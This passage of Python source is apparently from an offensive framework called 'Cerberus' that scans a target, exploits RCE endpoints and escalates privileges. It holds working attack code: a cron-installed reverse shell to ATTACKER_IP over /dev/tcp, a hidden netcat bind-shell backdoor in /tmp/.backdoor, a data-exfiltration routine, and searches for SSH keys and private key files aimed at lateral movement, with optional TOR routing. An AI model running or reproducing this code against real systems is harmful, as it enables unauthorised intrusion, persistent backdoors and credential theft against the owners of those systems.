░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                          
               Cerberus Security Assessment & Exploitation
                 ✩₊˚.⋆☾⋆⁺₊✧ by: ek0ms savi0r ✩₊˚.⋆☾⋆⁺₊✧
{Colors.END}""")

    def run_comprehensive_assessment(self):
        """ENHANCED comprehensive security assessment with intelligent exploitation"""
        print(f"\n{Colors.GREEN}[+] Cerberus Security Assessment Framework v5.1{Colors.END}")
        print(f"{Colors.YELLOW}[*] Enhanced with Intelligent RCE Exploitation{Colors.END}")
        print(f"{Colors.YELLOW}[*] Interactive Mode - No command line arguments needed{Colors.END}")
        
        # Get target information
        target = input(f"{Colors.BLUE}[?] Enter target IP/hostname: {Colors.END}").strip()
        if not target:
            print(f"{Colors.RED}[-] Target is required{Colors.END}")
            return
        
        try:
            port_input = input(f"{Colors.BLUE}[?] Enter target port (default 80): {Colors.END}").strip()
            port = int(port_input) if port_input else 80
        except ValueError:
            port = 80
        
        # TOR option
        use_tor = input(f"{Colors.BLUE}[?] Use TOR proxy? (y/n): {Colors.END}").lower().strip() == 'y'
        if use_tor:
            if self.tor_manager.enable_tor():
                print(f"{Colors.GREEN}[+] TOR proxy enabled{Colors.END}")
            else:
                print(f"{Colors.RED}[-] TOR setup failed, continuing without TOR{Colors.END}")
        
        # Scan type
        print(f"\n{Colors.PURPLE}[ SCAN OPTIONS ]{Colors.END}")
        print(f"{Colors.YELLOW}1. Quick Scan (Network + Web){Colors.END}")
        print(f"{Colors.YELLOW}2. Full Assessment (Network + Web + Exploitation){Colors.END}")
        print(f"{Colors.YELLOW}3. Network Scan Only{Colors.END}")
        print(f"{Colors.YELLOW}4. Web Scan Only{Colors.END}")
        
        scan_type = input(f"{Colors.BLUE}[?] Select scan type (1-4): {Colors.END}").strip()
        
        auto_exploit = False
        if scan_type == '2':
            auto_exploit = input(f"{Colors.BLUE}[?] Enable auto-exploit? (y/n): {Colors.END}").lower() == 'y'
        
        print(f"\n{Colors.GREEN}[+] Starting assessment for {target}:{port}{Colors.END}")
        
        self.report_data['target'] = f"{target}:{port}"
        
        # Store open ports for service-specific exploitation
        open_ports_info = []
        
        # Network scanning for all types except web-only
        if scan_type in ['1', '2', '3']:
            print(f"\n{Colors.PURPLE}[ PHASE 1: Network Reconnaissance ]{Colors.END}")
            network_exploiter = NetworkExploiter(target)
            network_exploiter.comprehensive_scan()
            
            # NEW: Service-specific exploitation
            print(f"\n{Colors.PURPLE}[ PHASE 1.5: Service-Specific Exploitation ]{Colors.END}")
            service_exploiter = ServiceSpecificExploiter(target)
            
            # Common ports to check for service exploitation
            service_ports = [21, 22, 23, 53, 80, 443, 445, 3389]
            for port_num in service_ports:
                if NetworkScanner.port_scan(target, port_num):
                    service = NetworkScanner.enhanced_service_detection(target, port_num)
                    service_exploiter.exploit_service(port_num, service)
        
        # Web vulnerability scanning for all types except network-only
        if scan_type in ['1', '2', '4']:
            print(f"\n{Colors.PURPLE}[ PHASE 2: Enhanced Web Application Scanning ]{Colors.END}")
            web_scanner = WebVulnerabilityScanner(target, port)
            
            # Use threading with timeouts for web scanning
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                sql_future = executor.submit(web_scanner.scan_sql_injection)
                xss_future = executor.submit(web_scanner.scan_xss)
                rce_future = executor.submit(web_scanner.scan_rce_endpoints)
                
                try:
                    if sql_future.result(timeout=10):
                        self._add_finding('SQL Injection', 'HIGH', 'SQL injection vulnerability detected')
                except concurrent.futures.TimeoutError:
                    print(f"{Colors.YELLOW}[!] SQL injection scan timed out{Colors.END}")
                
                try:
                    if xss_future.result(timeout=10):
                        self._add_finding('XSS', 'MEDIUM', 'Cross-site scripting vulnerability detected')
                except concurrent.futures.TimeoutError:
                    print(f"{Colors.YELLOW}[!] XSS scan timed out{Colors.END}")
                
                try:
                    rce_result = rce_future.result(timeout=15)
                    if rce_result:
                        self._add_finding('RCE Endpoint', 'CRITICAL', 'Potential RCE endpoint found')
                        # Store found endpoints for later exploitation
                        found_endpoints = web_scanner.found_rce_endpoints
                        if found_endpoints:
                            print(f"{Colors.GREEN}[+] RCE endpoints identified: {found_endpoints}{Colors.END}")
                except concurrent.futures.TimeoutError:
                    print(f"{Colors.YELLOW}[!] RCE endpoint scan timed out{Colors.END}")
        
        # Command execution and exploitation for full assessment
        if scan_type == '2':
            print(f"\n{Colors.PURPLE}[ PHASE 3: Intelligent Command Execution ]{Colors.END}")
            
            # Use found RCE endpoints for enhanced exploitation
            found_endpoints = getattr(web_scanner, 'found_rce_endpoints', []) if 'web_scanner' in locals() else []
            shell_manager = RealShellManager(target, port, self, found_endpoints)
            
            if shell_manager.test_command_execution():
                self._add_finding('Command Execution', 'CRITICAL', 'Remote command execution achieved')
                
                # Step 4: Privilege escalation
                print(f"\n{Colors.PURPLE}[ PHASE 4: Privilege Escalation ]{Colors.END}")
                priv_escalation = PrivilegeEscalation(shell_manager)
                
                if priv_escalation.attempt_escalation():
                    self._add_finding('Privilege Escalation', 'CRITICAL', 'Successfully escalated privileges')
                    
                    # Step 5: Persistence
                    print(f"\n{Colors.PURPLE}[ PHASE 5: Persistence ]{Colors.END}")
                    self._establish_persistence(shell_manager)
                
                # Step 6: Post-exploitation
                if auto_exploit or input(f"{Colors.BLUE}[?] Start post-exploitation? (y/n): {Colors.END}").lower() == 'y':
                    self._post_exploitation_menu(shell_manager)
        
        # Generate report
        self._generate_report()
        
        # Disable TOR if it was enabled
        if use_tor:
            self.tor_manager.disable_tor()
        
        print(f"\n{Colors.GREEN}[+] Assessment complete!{Colors.END}")

    def _establish_persistence(self, shell_manager: RealShellManager):
        """Establish persistence mechanisms"""
        print(f"{Colors.CYAN}[>] Establishing persistence...{Colors.END}")
        
        # Add cron job
        try:
            cron_cmd = "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
            result = shell_manager.execute_real_command(f'(crontab -l ; echo "{cron_cmd}") | crontab -')
            if "Command execution failed" not in result:
                print(f"{Colors.GREEN}[+] Cron job persistence added{Colors.END}")
        except:
            pass
        
        # Create backdoor
        try:
            backdoor_cmd = "echo '#!/bin/bash\nwhile true; do nc -lvp 1337 -e /bin/bash; done' > /tmp/.backdoor && chmod +x /tmp/.backdoor"
            result = shell_manager.execute_real_command(backdoor_cmd)
            if "Command execution failed" not in result:
                print(f"{Colors.GREEN}[+] Backdoor created at /tmp/.backdoor{Colors.END}")
        except:
            pass

    def _add_finding(self, finding_type: str, severity: str, details: str):
        """Helper to add findings"""
        self.report_data['findings'].append({
            'type': finding_type,
            'severity': severity,
            'details': details,
            'timestamp': datetime.now().isoformat()
        })

    def _post_exploitation_menu(self, shell_manager: RealShellManager):
        """Post-exploitation options"""
        while True:
            print(f"\n{Colors.PURPLE}{'='*60}{Colors.END}")
            print(f"{Colors.PURPLE}[ POST-EXPLOITATION MENU ]{Colors.END}")
            print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[1]{Colors.END} Interactive Shell")
            print(f"{Colors.CYAN}[2]{Colors.END} Data Exfiltration") 
            print(f"{Colors.CYAN}[3]{Colors.END} System Information")
            print(f"{Colors.CYAN}[4]{Colors.END} Network Reconnaissance")
            print(f"{Colors.CYAN}[5]{Colors.END} Lateral Movement")
            print(f"{Colors.CYAN}[6]{Colors.END} Persistence")
            print(f"{Colors.CYAN}[7]{Colors.END} Return to Main")
            print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
            
            choice = input(f"{Colors.BLUE}[?] Select option: {Colors.END}").strip()
            
            if choice == '1':
                shell_manager.interactive_shell()
            elif choice == '2':
                self._data_exfiltration(shell_manager)
            elif choice == '3':
                self._system_info(shell_manager)
            elif choice == '4':
                self._network_recon(shell_manager)
            elif choice == '5':
                self._lateral_movement(shell_manager)
            elif choice == '6':
                self._establish_persistence(shell_manager)
            elif choice == '7':
                break
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")

    def _data_exfiltration(self, shell_manager: RealShellManager):
        """Exfiltrate sensitive data"""
        print(f"{Colors.CYAN}[>] Exfiltrating sensitive data...{Colors.END}")
        
        data = shell_manager.extract_real_data()
        
        if data:
            # Save to file
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"exfiltrated_data_{shell_manager.target}_{timestamp}.txt"
            
            with open(filename, 'w') as f:
                f.write("EXFILTRATED DATA REPORT\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {shell_manager.target}:{shell_manager.port}\n")
                f.write(f"Time: {datetime.now().isoformat()}\n\n")
                
                for file_path, content in data.items():
                    f.write(f"FILE: {file_path}\n")
                    f.write("-" * 40 + "\n")
                    f.write(content)
                    f.write("\n\n")
            
            print(f"{Colors.GREEN}[+] Data saved to: {filename}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No data could be extracted{Colors.END}")

    def _system_info(self, shell_manager: RealShellManager):
        """Gather system information"""
        print(f"{Colors.CYAN}[>] Gathering system information...{Colors.END}")
        
        commands = {
            "Kernel Info": "uname -a",
            "CPU Info": "cat /proc/cpuinfo | grep 'model name' | head -1",
            "Memory Info": "free -h",
            "Disk Usage": "df -h",
            "Current User": "whoami && id",
            "Processes": "ps aux | head -20"
        }
        
        for desc, cmd in commands.items():
            result = shell_manager.execute_real_command(cmd)
            if result and "Command execution failed" not in result:
                print(f"{Colors.YELLOW}[{desc}]{Colors.END} {result.strip()}")

    def _network_recon(self, shell_manager: RealShellManager):
        """Internal network reconnaissance"""
        print(f"{Colors.CYAN}[>] Performing internal network reconnaissance...{Colors.END}")
        
        commands = {
            "Network Interfaces": "ifconfig || ip addr",
            "Routing Table": "route -n || ip route",
            "ARP Table": "arp -a || ip neigh",
            "Active Connections": "netstat -tulpn || ss -tulpn"
        }
        
        for desc, cmd in commands.items():
            result = shell_manager.execute_real_command(cmd)
            if result and "Command execution failed" not in result:
                print(f"{Colors.YELLOW}[{desc}]{Colors.END}")
                print(result)

    def _lateral_movement(self, shell_manager: RealShellManager):
        """Lateral movement techniques"""
        print(f"{Colors.CYAN}[>] Attempting lateral movement...{Colors.END}")
        
        # Check for SSH keys
        result = shell_manager.execute_real_command("find /home /root -name '.ssh' -type d 2>/dev/null")
        if result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] SSH directories found:{Colors.END}")
            print(result)
        
        # Check for password files
        result = shell_manager.execute_real_command("find / -name '*.pem' -o -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | head -10")
        if result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] Potential key files found:{Colors.END}")
            print(result)

    def _generate_report(self):
        """Generate final report"""
        print(f"\n{Colors.CYAN}[>] Generating assessment report...{Colors.END}")
        
        self.report_data['scan_end_time'] = datetime.now().isoformat()
        
        filename = f"cerberus_assessment_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w') as f:
            f.write("CERBERUS SECURITY ASSESSMENT REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Scan Date: {self.report_data['scan_start_time']}\n")
            f.write(f"Target: {self.report_data['target']}\n")
            f.write(f"Report Generated: {self.report_data['scan_end_time']}\n\n")
            
            f.write("FINDINGS SUMMARY:\n")
            f.write("-" * 20 + "\n")
            
            for finding in self.report_data['findings']:
                f.write(f"Type: {finding['type']}\n")
                f.write(f"Severity: {finding['severity']}\n")
                f.write(f"Details: {finding['details']}\n")
                f.write(f"Time: {finding['timestamp']}\n\n")
        
        print(f"{Colors.GREEN}[+] Report saved to: {filename}{Colors.END}")

def main():
    scanner = ComprehensiveScanner()
    
    try:
        scanner.run_comprehensive_assessment()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Assessment interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()
